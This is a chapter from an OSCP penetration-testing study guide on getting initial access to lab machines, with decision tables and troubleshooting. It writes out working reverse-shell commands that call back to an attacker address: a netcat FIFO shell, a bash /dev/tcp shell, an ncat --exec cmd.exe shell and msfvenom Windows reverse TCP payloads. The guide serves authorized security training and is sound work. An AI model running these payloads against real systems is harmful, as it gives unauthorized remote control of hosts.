# Initial Access — OSCP Decision-Based Methodology

> **Scope:** Authorized OSCP labs and explicitly assigned targets only.
>
> **Goal:** Convert a **verified** weakness into a controlled, documented foothold. Work through the decision points rather than running every command.
>
> **Exam rules:** Review the current [OffSec OSCP exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) before the exam. This chapter emphasizes manual techniques and common utilities. Do **not** use prohibited automatic exploitation tools, SQLmap, or AI chatbots during the exam. Metasploit/Meterpreter have special one-target restrictions; consult the current official wording before using them. Tool permission does not automatically make every feature permissible.

## 0. Start from a verified finding

Before attempting access, write down:

```text
Target IP / hostname:
Service and port:
Discovered endpoint or vulnerable feature:
Evidence confirming the weakness:
Required authentication / privileges:
Expected execution context (web user, service user, etc.):
Likely target OS:
Chosen access technique:
Fallback if it fails:
```

**Decision:** No confirmed weakness? Return to [service enumeration](../01-Enumeration/service-enumeration.md) or [web vulnerability testing](../02-Web-Application/web-vulnerability-testing.md). Do not jump straight to payloads.

## 1. Select the least-complex entry point

| Verified finding | First access path | What to verify |
| --- | --- | --- |
| Valid SSH credentials | Direct SSH login | Correct account, host and shell |
| Valid SMB credentials | Check allowed shares and remote administration rights | A share login alone is not a shell |
| Web command execution | Controlled command proof, then shell if needed | Output and execution user |
| File upload that executes server-side code | Minimal in-scope execution proof | Execution actually occurs; upload alone is insufficient |
| LFI / arbitrary file read | Gather non-sensitive configuration clues within scope | File read is not necessarily code execution |
| SQL injection | Manual verification and assess feasible impact | SQLi does not automatically provide OS access |
| Exposed admin interface | Authenticate using approved credentials | App admin access is not necessarily host access |
| Version-specific vulnerability | Verify prerequisites and advisory details | Banner/CVE match is not confirmation |

Prefer valid credentials or a direct shell over unnecessarily complex chains. Record why you chose a path.

## 2. Confirm target and attacker connectivity

On Kali:

```bash
export IP=192.168.56.101       # Assigned lab target
export LHOST=192.168.45.10      # Your reachable VPN/tun interface address
export LPORT=4444               # Available local listener port
mkdir -p scans/initial-access evidence/initial-access

ip -br addr
ip route get "$IP"
nc -vz -w 3 "$IP" 22
```

The SSH port check is only relevant if 22/tcp was found open. **Do not blindly use a local LAN address** for `LHOST`; choose the address the target can reach through the lab network. Check that the selected local port is free:

```bash
ss -lnt | grep ":$LPORT " || true
```

If the target cannot reach your VPN address, investigate routing and firewall rules before changing payloads.

## 3. Path A — use verified credentials first

For a discovered and authorized SSH account:

```bash
ssh -o ConnectTimeout=5 USER@"$IP"
```

Replace `USER` with the verified account. Confirm host-key identity when prompted; don't automatically bypass host-key checks. After login:

```bash
whoami
id
hostname
pwd
```

For a Windows lab host, valid credentials may allow RDP or another explicitly enabled management service; a successful web or SMB login **does not imply** remote shell rights.

**If login fails:** distinguish invalid credentials, disabled remote login, missing service, and network filtering. Do not start bulk password guessing.

## 4. Path B — confirmed web command execution

Use a harmless marker first in the application's verified command-execution input:

```bash
whoami
id
hostname
```

These commands are **payload examples for a previously verified, in-scope command-execution field**, not proof that an arbitrary parameter is vulnerable. For Windows, use `whoami` and `hostname`.

Record the exact HTTP request, response, and execution account. If the application returns no output, check whether the function is blind or asynchronous; lack of output alone does not prove failure.

### Choose interactive access only when needed

If the lab permits a reverse connection, prepare a listener **before** triggering a payload:

```bash
rlwrap nc -lvnp "$LPORT"
```

`rlwrap` is optional. Without it:

```bash
nc -lvnp "$LPORT"
```

### Two Linux RCE-to-shell PoCs — Bash and Netcat FIFO

These are **post-confirmation access examples for an authorized OSCP lab only**, not initial vulnerability-detection payloads. First prove command execution with `whoami` or `id` as above. On **Kali**, identify the correct VPN IP with `ip -br addr` and start the listener before submitting either command:

```bash
nc -lvnp 4444
```

**PoC A — Netcat with a named pipe (FIFO):**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.219 4444 >/tmp/f
```

This is the supplied lab example. **Important:** `rm /tmp/f` removes anything already stored at that path. Do **not** run it unless you have checked that `/tmp/f` belongs to your authorized disposable lab session; use a uniquely named FIFO instead if there is any doubt. This method requires `mkfifo`, a working `nc` binary and a reachable outbound TCP connection. It creates a FIFO in `/tmp`; clean up only your own FIFO when finished.

**PoC B — Bash TCP reverse shell:**

```bash
bash -c "bash -i >& /dev/tcp/192.168.45.219/4444 0>&1"
```

This requires **Bash** with `/dev/tcp` support. Netcat is not required on the target for PoC B.

**Before testing:** replace `192.168.45.219` with your **actual Kali VPN address reachable from the target** and `4444` with the listener port; the addresses here are examples. Submit **only one payload at a time** through a **confirmed command-injection/RCE point**. When sent in a web parameter, quotes, spaces, `&` and redirection characters may need proper encoding; a working standalone shell command does not automatically work in an HTTP parameter.

**RCE versus reverse shell:** a demonstrated output marker proves command execution; receiving a shell only demonstrates a foothold at the **service account's** current privileges. If a callback fails, check Bash/Netcat availability, listeners, VPN routing, egress filtering, process lifetime, quoting and encoding before retrying.

**What success looks like:** the listener receives a connection, and `whoami`/`id` identify the expected low-privileged service account. A connection that immediately closes may indicate an incompatible shell, missing binary or application timeout.

**What failure means:** check listener binding, `LHOST`, routing, egress filtering, quoting, URL encoding, command length and execution context. Avoid repeatedly firing unverified payloads.

### Windows RCE-to-shell PoCs — Ncat and Windows executable

Use only on an explicitly authorized Windows OSCP practice machine after verifying command execution. These are examples for obtaining an interactive foothold; they do not elevate privileges or bypass Windows security controls.

**1. Confirm Windows execution and architecture.** Through the verified command-execution interface, run:

```cmd
whoami
hostname
ver
echo %PROCESSOR_ARCHITECTURE%
echo %PROCESSOR_ARCHITEW6432%
```

These examples assume cmd.exe. The second architecture variable can reveal a 32-bit process running on 64-bit Windows; verify the actual OS architecture before choosing a payload.

**2. Prepare a listener on Kali.** Use your current reachable VPN address, not the Windows target IP. The examples below reuse the illustrative callback address `192.168.45.219` and port `4444`.

```bash
ip -br addr
nc -lvnp 4444
```

Keep the listener running in a separate terminal.

**3. Option A — Ncat, when already available on the Windows lab machine.**

```cmd
ncat.exe --exec cmd.exe 192.168.45.219 4444
```

This is the Nmap Ncat executable, not a guarantee that any program named nc.exe supports the same options. Only use it if it is already available or explicitly provided by your authorized lab. The Windows machine must be able to reach the Kali listener.

**4. Option B — non-Meterpreter Windows reverse TCP shell executable.** On Kali, generate a Windows executable appropriate for your confirmed target architecture:

```bash
# 64-bit Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o windows-shell-x64.exe

# 32-bit Windows alternative (choose ONE architecture)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o windows-shell-x86.exe
```

The callback addresses must match your actual reachable Kali VPN IP and listener. These are plain command-shell payloads, not Meterpreter; a normal Netcat listener is appropriate. Only place the chosen file on the assigned target through a verified, authorized lab delivery mechanism. Once the matching executable is present in an approved writable directory, invoke that file through the confirmed Windows command-execution point. For example, in cmd.exe, if the 64-bit file was placed in your current directory:

```cmd
.\windows-shell-x64.exe
```

Use the x86 filename instead if that was the selected architecture. An HTTP RCE input may require correct encoding/quoting. Do not assume a file upload executes the file, and do not bypass endpoint security or turn off protections when execution is blocked.

**5. Verify the callback and effective privileges.** In the received Windows command shell:

```cmd
whoami
whoami /all
hostname
ipconfig
```

A callback might run as a web-service or other restricted account. It does **not** imply administrator or SYSTEM rights. Continue with [Windows Privilege Escalation](../04-Privilege-Escalation/windows-privesc.md); review token privileges, service configuration, ACLs and scheduled tasks. Use [Pivoting and Tunneling](../07-Pivoting/pivoting-tunneling.md) only when a separate in-scope network objective requires it.

**Troubleshooting:** if the listener receives nothing, verify the execution point, Windows architecture, Ncat or executable availability, reachable VPN IP, port, outbound filtering, and process lifetime. Do not repeatedly launch payloads or attempt to disable endpoint protection. Close the session and remove only your own temporary lab artifacts when finished.

**OSCP+ exam policy:** The [official OffSec Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) permits `msfvenom` across targets, subject to the one-target Meterpreter restriction. Other Metasploit modules remain restricted as described in the guide. The examples above use non-Meterpreter shells. A Windows proof screenshot must show the original proof contents from an interactive target shell and the target IP. Recheck the current guide before exam day.

## 5. Path C — file-upload execution, only after verification

A successful upload is **not** evidence of code execution. First document:

1. Which file types the server accepts and whether it renames them.
2. Where files are stored and whether the URL is accessible.
3. Whether the server **executes** the uploaded content or only serves it as a download.
4. Whether the application stack supports the chosen server-side language.

Use a minimal, non-destructive lab proof of execution first. Only consider a shell when execution is confirmed and the exercise authorizes it. Do not upload web shells to an application merely because it accepts a file.

## 6. Path D — CVE-based entry points

Before trying a public proof-of-concept:

```bash
searchsploit "PRODUCT VERSION"
```

Replace the example with the observed product/version. Check vendor advisories, the exact affected versions, required configuration, authentication, architecture, and side effects.

```bash
searchsploit -x EXPLOIT_ID
```

Use the actual SearchSploit identifier from your results. **Read source code before running it.** Avoid automated exploitation frameworks or tools forbidden by exam policy. A CVE match or a successful scanner response does not prove host access.

## 7. Stabilize a Linux shell

For a basic Linux TTY, check the available interpreter:

```bash
command -v python3 || command -v python
```

If Python 3 is available, in the **target shell**:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

For a typical Netcat reverse shell, you can then use this sequence **only if your local terminal and connection support job control**:

1. Press `Ctrl+Z` to suspend the local listener.
2. On **Kali**, run `stty raw -echo; fg`, then press Enter.
3. In the resumed **target shell**, run `reset` if needed and set the terminal type:

```bash
export TERM=xterm
stty rows 40 columns 120
```

If the terminal becomes unusable, recover on Kali with `stty sane` (you may need to type it without visible echo). Not every shell supports a full TTY upgrade; do not let stabilization consume excessive exam time.

## 8. Confirm the foothold and document immediately

On Linux:

```bash
whoami
id
hostname
uname -a
pwd
```

On Windows:

```cmd
whoami
hostname
ver
cd
```

Record the account, host, working directory, OS, shell type and the exact vulnerability used. Avoid altering persistence settings or collecting unrelated user data.

**Next action after an RCE foothold:** identify the current user, groups and operating system, then use [Linux Privilege Escalation](../04-Privilege-Escalation/linux-privesc.md) or [Windows Privilege Escalation](../04-Privilege-Escalation/windows-privesc.md). A reverse shell does **not** automatically grant root/SYSTEM.

**Privilege escalation and pivoting are different steps:** privilege escalation gains stronger rights on the **current host**; [Pivoting and Tunneling](../07-Pivoting/pivoting-tunneling.md) uses an authorized host to reach a **different in-scope network or service**. Pivoting is necessary **only if the next lab objective requires it**, and it does not inherently require root or SYSTEM. Check your foothold, scope, network routes and allowed access first.

## 9. Troubleshooting decision table

| Symptom | First check |
| --- | --- |
| Listener receives nothing | Wrong `LHOST`, route, firewall, port, or command execution |
| Listener connects then drops | Shell compatibility, quoting, process lifetime |
| Command runs but no output | Blind execution, output redirection, asynchronous handler |
| SSH rejects login | Username, credential validity, SSH policy, target service |
| Uploaded file downloads instead of running | Static storage / no server-side execution |
| Public exploit fails | Version mismatch, unmet prerequisites, architecture, patches |
| Shell is unstable | Try basic commands first, then optional TTY stabilization |
| Wrong host/user | Recheck IP, hostname, process account and evidence |

## 10. Exam-ready checklist

- [ ] Confirm the vulnerability before selecting a payload.
- [ ] Check exam tool restrictions and exercise scope.
- [ ] Identify OS, service, port and likely execution context.
- [ ] Choose the simplest verified access route.
- [ ] Confirm reachable `LHOST` and prepare a listener if needed.
- [ ] Use a harmless execution marker before seeking a shell.
- [ ] Check quoting, encoding and network paths when a payload fails.
- [ ] Verify the shell account and hostname.
- [ ] Stabilize only if useful and supported.
- [ ] After confirmed RCE, choose one authorized Bash or FIFO/Netcat shell PoC, verify the callback and avoid overwriting another file at `/tmp/f`.
- [ ] On Windows, confirm OS architecture, use the matching authorized Ncat or non-Meterpreter shell method, verify the callback and effective token with `whoami /all`, then assess local privilege escalation.
- [ ] Distinguish local privilege escalation from pivoting; use only the next step justified by the lab scope.
- [ ] Save sanitized evidence and note the next privilege-escalation path.

## References

- [OffSec OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
- [OffSec OSCP FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

**Previous:** [Web Vulnerability Testing](../02-Web-Application/web-vulnerability-testing.md)
